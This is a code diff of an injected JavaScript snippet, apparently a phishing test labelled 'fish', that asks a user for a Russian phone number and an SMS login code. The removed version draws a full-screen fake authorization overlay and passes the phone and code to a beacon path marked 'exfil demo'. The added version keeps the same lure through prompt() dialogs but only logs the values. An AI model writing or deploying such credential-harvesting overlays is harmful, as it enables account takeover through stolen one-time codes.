@@ -1,197 +1,127 @@
-alert('fish new1');
+alert('fish 2');
 (function(){
+  // Утилиты
+  function stripDigits(s){ return (s || '').replace(/\D/g, ''); }
 
-  function stripNonDigits(s){ return String(s || '').replace(/\D/g, ''); }
-
-  function normalizeRussianPhone(raw) {
-    const d = stripNonDigits(raw);
-    if (d.length === 11 && (d.startsWith('7') || d.startsWith('8'))) {
-      // если начинается с 8 — считаем как 7
+  // Нормализация РФ номера -> +7XXXXXXXXXX или null
+  function normalizeRussianPhone(raw){
+    const d = stripDigits(raw);
+    if(d.length === 11 && (d[0] === '7' || d[0] === '8')){
       return '+7' + d.slice(1);
     }
-    if (d.length === 10) {
+    if(d.length === 10){
       return '+7' + d;
     }
     return null;
   }
 
-  function isValidRussianPhone(raw) {
-    return normalizeRussianPhone(raw) !== null;
-  }
-
-  function isValidSmsCode(raw) {
-    const d = stripNonDigits(raw);
+  function isValidSmsCode(raw){
+    const d = stripDigits(raw);
     return d.length >= 4 && d.length <= 6;
   }
 
-  // -----------------------
-  // Создать полноэкранный модал prompt
-  // -----------------------
-  function createModalPrompt(options){
-    // options: { title, placeholder, initial, inputType:'tel'|'text'|'number', validator(fn), maxlength, submitText, cancelText }
-    return new Promise(function(resolve, reject){
-      const opt = Object.assign({
-        title: 'Введите значение',
-        placeholder: '',
-        initial: '',
-        inputType: 'tel',
-        validator: function(){ return true; },
-        maxlength: 256,
-        submitText: 'OK',
-        cancelText: 'Отмена'
-      }, options || {});
+  // Простая защита от brute-force: блокировка на N секунд после M попыток
+  let attemptCounter = 0;
+  let blockedUntil = 0;
+  const MAX_ATTEMPTS = 5;
+  const BLOCK_SECONDS = 60; // 1 минута блокировка после MAX_ATTEMPTS
 
-      // overlay
-      const overlay = document.createElement('div');
-      overlay.style.cssText = [
-        'position:fixed',
-        'left:0;right:0;top:0;bottom:0',
-        'background:rgba(0,0,0,0.6)',
-        'display:flex',
-        'align-items:center',
-        'justify-content:center',
-        'z-index:2147483647', // максимально высокий
-        'backdrop-filter: blur(4px)'
-      ].join(';');
-
-      // modal
-      const modal = document.createElement('div');
-      modal.style.cssText = [
-        'width:calc(100% - 40px)',
-        'max-width:720px',
-        'background:#fff',
-        'border-radius:12px',
-        'padding:20px',
-        'box-sizing:border-box',
-        'box-shadow:0 20px 40px rgba(0,0,0,0.3)',
-        'font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
-      ].join(';');
-
-      modal.innerHTML = `
-        <div style="font-size:18px;font-weight:600;margin-bottom:12px;">${opt.title}</div>
-        <div style="margin-bottom:12px;"><input id="__modal_input" inputmode="${opt.inputType==='tel'?'tel':'text'}" placeholder="${opt.placeholder}" value="${opt.initial}"
-            style="width:100%;padding:14px;border-radius:8px;border:1px solid #ddd;font-size:16px;box-sizing:border-box;" maxlength="${opt.maxlength}"></div>
-        <div style="display:flex;gap:8px;justify-content:flex-end">
-          <button id="__modal_cancel" style="padding:12px 16px;border-radius:8px;border:none;background:#eee;font-size:15px;cursor:pointer">${opt.cancelText}</button>
-          <button id="__modal_ok" style="padding:12px 16px;border-radius:8px;border:none;background:#00b33c;color:#fff;font-size:15px;cursor:pointer" disabled>${opt.submitText}</button>
-        </div>
-      `;
-      overlay.appendChild(modal);
-      document.body.appendChild(overlay);
-
-      const input = document.getElementById('__modal_input');
-      const btnOk = document.getElementById('__modal_ok');
-      const btnCancel = document.getElementById('__modal_cancel');
-
-      // helper to update OK enabled state
-      function updateValid(){
-        try {
-          const v = input.value;
-          const ok = !!opt.validator(v);
-          btnOk.disabled = !ok;
-        } catch(e) {
-          btnOk.disabled = true;
-        }
-      }
-      updateValid();
-
-      // restrict input: allow digits, +, spaces, parentheses, hyphen; remove others
-      input.addEventListener('input', function(e){
-        if(opt.inputType === 'tel'){
-          const before = input.value;
-          // keep digits, +, spaces, parentheses, dash
-          const cleaned = before.replace(/[^0-9+\-\s()]/g,'');
-          if(cleaned !== before) input.value = cleaned;
-        }
-        updateValid();
-      });
-
-      // submit handler
-      btnOk.addEventListener('click', function(){
-        const val = input.value;
-        cleanup();
-        resolve(val);
-      });
-      btnCancel.addEventListener('click', function(){
-        cleanup();
-        resolve(null);
-      });
-
-      function cleanup(){
-        // remove modal and restore focus
-        try { overlay.remove(); } catch(e){}
-      }
-
-      // focus input, open keyboard
-      setTimeout(()=>{ input.focus(); try{ input.select(); }catch(e){} }, 60);
-    });
+  function isBlocked(){
+    return Date.now() < blockedUntil;
   }
 
-  // -----------------------
-  // Usage: step-by-step with validation
-  // -----------------------
-  async function askPhoneAndCode() {
-    // ask phone
-    const phoneRaw = await createModalPrompt({
-      title: 'Требуется подтверждение авторизации',
-      placeholder: '+7 (___) ___-__-__',
-      inputType: 'tel',
-      validator: function(v){
-        return isValidRussianPhone(v);
-      },
-      submitText: 'Получить код',
-      cancelText: 'Отмена',
-    });
-    if(!phoneRaw){
-      b('/defender/phone_cancelled','user_cancelled');
-      return null;
+  function recordAttemptAndMaybeBlock(){
+    attemptCounter++;
+    if(attemptCounter >= MAX_ATTEMPTS){
+      blockedUntil = Date.now() + BLOCK_SECONDS * 1000;
+      attemptCounter = 0; // сбросим счётчик после блокировки
     }
-    const normalized = normalizeRussianPhone(phoneRaw); // +7XXXXXXXXXX or null
-    if(!normalized){
-      b('/defender/phone_invalid', phoneRaw);
-      return null;
-    }
-    b('/v10p/PHONE_FORM', normalized);
-
-    // ask code
-    const code = await createModalPrompt({
-      title: 'Введите код из SMS',
-      placeholder: '____',
-      inputType: 'tel',
-      validator: function(v){ return isValidSmsCode(v); },
-      submitText: 'Войти',
-      cancelText: 'Отмена'
-    });
-    if(!code){
-      b('/defender/code_cancelled','user_cancelled');
-      return null;
-    }
-    if(!isValidSmsCode(code)){
-      b('/defender/code_invalid', code);
-      return null;
-    }
-
-    const final = { phone: normalized, code: stripNonDigits(code) };
-    b('/v10p/CREDS', final); // exfil demo
-    // optionally return to app:
-    if(window.ReactNativeWebView && window.ReactNativeWebView.postMessage){
-      window.ReactNativeWebView.postMessage(JSON.stringify({ action: 'navigateBack', phone: normalized }));
-    }
-    return final;
   }
 
-  // start
-  setTimeout(function(){
-    askPhoneAndCode().then(res=>{
-      // handle result
-      if(res) {
-        // show success message
-        alert('Готово! Код принят.');
-      }
-    });
-  }, 200);
+  // Синхронный prompt-flow (prompt() блокирует)
+  function askPhoneWithPrompt(){
+    if(isBlocked()){
+      alert('Слишком много попыток. Попробуйте позже.');
+      return null;
+    }
 
-  // expose helpers for debug
-  window.__normalizeRussianPhone = normalizeRussianPhone;
-  window.__isValidRussianPhone = isValidRussianPhone;
+    // Показываем origin, чтобы пользователь видел, куда вводит данные
+    // Это важная защитная ремарка: user should verify origin before entering sensitive data
+    try {
+      alert('Введите номер для сайта: ' + (location && location.origin ? location.origin : 'неизвестно'));
+    } catch(e){ /* ignore */ }
+
+    let attempts = 0;
+    while(attempts < 3){
+      const raw = prompt('Введите номер телефона (пример: +7 9xx xxx-xx-xx)', '+7');
+      if(raw === null){ // пользователь нажал Отмена
+        recordAttemptAndMaybeBlock();
+        return null;
+      }
+      const norm = normalizeRussianPhone(raw);
+      if(norm){
+        // Успешно нормализовали
+        return norm;
+      }
+      alert('Неверный формат номера. Введите российский номер, например +7XXXXXXXXXX.');
+      attempts++;
+    }
+    // неудачно - считаем попытки
+    recordAttemptAndMaybeBlock();
+    return null;
+  }
+
+  function askCodeWithPrompt(){
+    if(isBlocked()){
+      alert('Слишком много попыток. Попробуйте позже.');
+      return null;
+    }
+    let attempts = 0;
+    while(attempts < 3){
+      const raw = prompt('Введите код из SMS (4–6 цифр)', '');
+      if(raw === null){
+        recordAttemptAndMaybeBlock();
+        return null;
+      }
+      if(isValidSmsCode(raw)){
+        return stripDigits(raw);
+      }
+      alert('Код должен содержать 4–6 цифр. Попробуйте ещё раз.');
+      attempts++;
+    }
+    recordAttemptAndMaybeBlock();
+    return null;
+  }
+
+  // Заглушка: обработать полученные валидные данные (замените на безопасную серверную логику)
+  function handleCollectedCredentials(phone, code){
+    // НИ В КОЕМ СЛУЧАЕ не отправляйте на сторонние адреса без проверки и согласия.
+    // Здесь пример безопасной обработки: лог в консоль (для dev) и вызов защищённого API (placeholder).
+    console.log('Collected (normalized) phone:', phone, 'code:', code);
+    // Пример (псевдо): отправляйте на ваш доверенный сервер по HTTPS:
+    // fetch('/api/confirm-phone', { method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone, code}) })
+    //  .then(...)
+    alert('Спасибо. Данные приняты (в тестовом режиме они не отправляются).');
+  }
+
+  // Основной поток
+  const phone = askPhoneWithPrompt();
+  if(!phone) {
+    // пользователь отменил или блокировка
+    console.log('Phone input cancelled or blocked');
+    return;
+  }
+
+  // Можно показать ещё раз пользователю нормализованный номер перед вводом кода
+  alert('Мы отправим код на номер: ' + phone);
+
+  const code = askCodeWithPrompt();
+  if(!code){
+    console.log('Code input cancelled or blocked');
+    return;
+  }
+
+  // Обработка (без exfil)
+  handleCollectedCredentials(phone, code);
+
 })();
